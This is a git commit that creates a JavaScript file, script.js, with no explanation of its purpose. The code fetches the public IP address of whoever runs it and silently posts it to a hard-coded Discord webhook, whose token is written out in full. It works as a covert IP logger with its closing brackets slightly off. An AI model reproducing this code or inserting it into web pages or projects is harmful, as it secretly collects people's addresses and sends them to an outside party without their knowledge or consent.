7608761d15552b2b215bed74186021b4e0ea0ade
CornBoar <64176323+CornBoar@users.noreply.github.com>
2023-10-29 15:08:13 -0700

    Create script.js

---
+++ e/script.js
@@ -0,0 +1,26 @@
+async function fetchIP() {
+  const response = await fetch('https://api.ipify.org?format=json');
+  const data = await response.json();
+  const ip = data.ip;
+  return ip;
+}
+
+let externalIP;
+
+fetchIP()
+  .then(ip => {
+    externalIP = ip;
+    const params = {
+      username: 'real% =  = href ;;',
+      avatar_url: '',
+      content: externalIP,
+    };
+
+fetch('https://discord.com/api/webhooks/1117662800010039327/4jLfqlqSySpzHX-LDgK3ka8vbwSK2OAVtMkNGUL2UaMqjHkmf0_fbbc_bsEioGcNJR3u', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(params)
+})
+    })
